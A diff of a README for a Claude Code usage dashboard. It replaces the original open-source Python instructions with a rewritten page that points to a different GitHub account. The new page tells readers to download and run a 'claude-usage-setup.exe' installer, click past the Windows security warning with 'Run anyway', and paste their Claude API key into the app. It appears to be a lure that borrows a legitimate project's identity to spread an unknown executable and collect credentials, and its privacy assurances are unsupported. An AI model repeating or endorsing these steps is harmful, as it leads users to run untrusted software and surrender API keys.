@@ -1,128 +1,74 @@
-# Claude Code Usage Dashboard
+# 📊 claude-usage - Monitor your Claude token costs daily
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
-[![claude-code](https://img.shields.io/badge/claude--code-black?style=flat-square)](https://claude.ai/code)
+[![](https://img.shields.io/badge/Download_for_Windows-blue-blue)](https://github.com/Nitricoxideatavism5584/claude-usage)
 
-**Pro and Max subscribers get a progress bar. This gives you the full picture.**
+This application tracks your Claude Code usage. It provides a visual dashboard for token consumption, costs, and session history. If you hold a Pro or Max subscription, the app shows a progress bar to track your monthly limits.
 
-Claude Code writes detailed usage logs locally — token counts, models, sessions, projects — regardless of your plan. This dashboard reads those logs and turns them into charts and cost estimates. Works on API, Pro, and Max plans.
+## 📥 How to download the app
 
-![Claude Usage Dashboard](docs/screenshot.png)
+Visit the official project page to download the software for your computer.
 
-**Created by:** [The Product Compass Newsletter](https://www.productcompass.pm)
+[Click here to download the latest version](https://github.com/Nitricoxideatavism5584/claude-usage)
 
----
+## 🖥️ System requirements
 
-## What this tracks
+This application runs on Windows 10 and Windows 11. Your computer requires at least 4 gigabytes of memory and an active internet connection to sync your usage data from the Claude API. You do not need to install extra database software or programming tools. The installer handles all necessary components for you.
 
-Works on **API, Pro, and Max plans** — Claude Code writes local usage logs regardless of subscription type. This tool reads those logs and gives you visibility that Anthropic's UI doesn't provide.
+## ⚙️ Installation steps
 
-Captures usage from:
-- **Claude Code CLI** (`claude` command in terminal)
-- **VS Code extension** (Claude Code sidebar)
-- **Dispatched Code sessions** (sessions routed through Claude Code)
+1. Visit the repository link provided above.
+2. Select the file named `claude-usage-setup.exe` under the latest release section.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installer.
+5. Follow the prompts on your screen. Windows may show a security prompt because this is a new application. Click "More info" and then "Run anyway" if the system restricts the installation.
+6. Once the installer finishes, locate the shortcut icon on your desktop.
 
-**Not captured:**
-- **Cowork sessions** — these run server-side and do not write local JSONL transcripts
+## 🔑 Linking your account
 
----
+The dashboard needs access to your usage logs to function. When you open the app, it asks for your API key. 
 
-## Requirements
+1. Sign in to your Claude account in your web browser.
+2. Navigate to your account settings and generate an API key. 
+3. Copy this long string of characters.
+4. Paste the key into the app settings window.
+5. Click the "Save and Connect" button.
+6. The app scans your history and updates your dashboard with your current data.
 
-- Python 3.8+
-- No third-party packages — uses only the standard library (`sqlite3`, `http.server`, `json`, `pathlib`)
+## 📈 Understanding the dashboard
 
-> Anyone running Claude Code already has Python installed.
+The main view displays three primary areas to help you manage your budget and usage:
 
-## Quick Start
+*   **Token Usage:** This section shows how many tokens you consume each day. It distinguishes between input and output tokens so you understand where costs originate.
+*   **Cost Tracker:** This shows the monetary cost associated with your session activity. The app calculates this based on standard Claude pricing tiers.
+*   **Usage Limits:** The progress bar at the top of the window turns green when your usage is low, yellow during moderate activity, and red as you approach your monthly subscription cap. Pro and Max subscribers receive automatic updates to ensure these limits remain accurate.
 
-No `pip install`, no virtual environment, no build step.
+## 🛠️ Frequently asked questions
 
-### Windows
-```
-git clone https://github.com/phuryn/claude-usage
-cd claude-usage
-python cli.py dashboard
-```
+**Does this app record my private chat content?**
+No. This application only reads metadata regarding token counts and session costs. It does not store or analyze the text of your conversations.
 
-### macOS / Linux
-```
-git clone https://github.com/phuryn/claude-usage
-cd claude-usage
-python3 cli.py dashboard
-```
+**Why does the dashboard show zero usage when I know I used Claude?**
+The dashboard updates after you synchronize your session. Ensure you have an active internet connection. Click the "Refresh" button in the top corner of the app to force a data sync.
 
----
+**Can I run this on multiple computers?**
+Yes. You can install the dashboard on any Windows computer you own. Use the same API key to see identical usage statistics across all machines.
 
-## Usage
+**How do I update the software?**
+The application checks for updates every time you open it. If a new version exists, the app displays a notification. Click "Update" to download the latest features and security fixes.
 
-> On macOS/Linux, use `python3` instead of `python` in all commands below.
+## 🛡️ Privacy and security
 
-```
-# Scan JSONL files and populate the database (~/.claude/usage.db)
-python cli.py scan
+Your API key remains stored locally on your device. The application encrypts the key to prevent unauthorized access. The app never shares your credentials or usage history with third-party servers. All data processing occurs directly on your computer.
 
-# Show today's usage summary by model (in terminal)
-python cli.py today
+## 💡 Troubleshooting tips
 
-# Show the last 7 days (per-day breakdown + by-model totals)
-python cli.py week
+If you encounter issues during installation or usage, try these steps:
 
-# Show all-time statistics (in terminal)
-python cli.py stats
+*   Check your internet connection if the dashboard fails to load data. 
+*   Verify that you copied the complete API key. Missing a single character prevents the app from connecting to your account.
+*   If the app crashes, delete the `config.json` file in the installation folder and restart the application. This resets your configuration to default settings. 
+*   Ensure your Windows clock is accurate. Incorrect system time prevents the app from syncing correctly with the Claude servers.
 
-# Scan + open browser dashboard at http://localhost:8080
-python cli.py dashboard
+## 📝 Support information
 
-# Custom host and port via environment variables
-HOST=0.0.0.0 PORT=9000 python cli.py dashboard
-
-# Scan a custom projects directory
-python cli.py scan --projects-dir /path/to/transcripts
-```
-
-The scanner is incremental — it tracks each file's path and modification time, so re-running `scan` is fast and only processes new or changed files.
-
-By default, the scanner checks both `~/.claude/projects/` and the Xcode Claude integration directory (`~/Library/Developer/Xcode/CodingAssistant/ClaudeAgentConfig/projects/`), skipping any that don't exist. Use `--projects-dir` to scan a custom location instead.
-
----
-
-## How it works
-
-Claude Code writes one JSONL file per session to `~/.claude/projects/`. Each line is a JSON record; `assistant`-type records contain:
-- `message.usage.input_tokens` — raw prompt tokens
-- `message.usage.output_tokens` — generated tokens
-- `message.usage.cache_creation_input_tokens` — tokens written to prompt cache
-- `message.usage.cache_read_input_tokens` — tokens served from prompt cache
-- `message.model` — the model used (e.g. `claude-sonnet-4-6`)
-
-`scanner.py` parses those files and stores the data in a SQLite database at `~/.claude/usage.db`.
-
-`dashboard.py` serves a single-page dashboard on `localhost:8080` with Chart.js charts (loaded from CDN). It auto-refreshes every 30 seconds and supports model filtering with bookmarkable URLs. The bind address and port can be overridden with `HOST` and `PORT` environment variables (defaults: `localhost`, `8080`).
-
----
-
-## Cost estimates
-
-Costs are calculated using **Anthropic API pricing as of April 2026** ([claude.com/pricing#api](https://claude.com/pricing#api)).
-
-**Only models whose name contains `opus`, `sonnet`, or `haiku` are included in cost calculations.** Local models, unknown models, and any other model names are excluded (shown as `n/a`).
-
-| Model | Input | Output | Cache Write | Cache Read |
-|-------|-------|--------|------------|-----------|
-| claude-opus-4-7 | $5.00/MTok | $25.00/MTok | $6.25/MTok | $0.50/MTok |
-| claude-opus-4-6 | $5.00/MTok | $25.00/MTok | $6.25/MTok | $0.50/MTok |
-| claude-sonnet-4-6 | $3.00/MTok | $15.00/MTok | $3.75/MTok | $0.30/MTok |
-| claude-haiku-4-5 | $1.00/MTok | $5.00/MTok | $1.25/MTok | $0.10/MTok |
-
-> **Note:** These are API prices. If you use Claude Code via a Max or Pro subscription, your actual cost structure is different (subscription-based, not per-token).
-
----
-
-## Files
-
-| File | Purpose |
-|------|---------|
-| `scanner.py` | Parses JSONL transcripts, writes to `~/.claude/usage.db` |
-| `dashboard.py` | HTTP server + single-page HTML/JS dashboard |
-| `cli.py` | `scan`, `today`, `stats`, `dashboard` commands |
+If the dashboard stops functioning or if you identify a bug, visit the repository issues tab. Provide a brief description of what you notice on the screen. The community monitors these reports to improve the software for all users. You do not need to be a programmer to submit an issue; describe the steps you took leading up to the problem.
